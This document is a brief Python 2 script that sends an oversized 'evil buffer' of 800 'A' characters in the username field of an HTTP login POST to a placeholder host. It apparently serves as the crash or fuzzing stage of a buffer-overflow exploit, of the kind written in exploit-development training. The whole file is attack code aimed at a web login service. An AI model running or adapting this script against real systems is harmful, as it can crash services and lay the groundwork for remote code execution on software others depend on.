#!/usr/bin/python
import socket

size = 800
try:
	print "Sending evil buffer ..."

	inputBuffer = "A" * size

 	content = "username=" + inputBuffer + "&password=A"
 	buffer = "POST /login HTTP/1.1\r\n"
 	buffer += "Host: *IP*\r\n"
 	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101Firefox/52.0\r\n"
 	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
 	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
 	buffer += "Referer: http://*IP*/login\r\n"
 	buffer += "Connection: close\r\n"
 	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
 	buffer += "Content-Length: "+str(len(content))+"\r\n"
 	buffer += "\r\n"
 	buffer += content
  
 	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
 	s.connect(("*IP*", 80))
 	s.send(buffer)
 	s.close()

except:
 	print "\nCould not connect!"
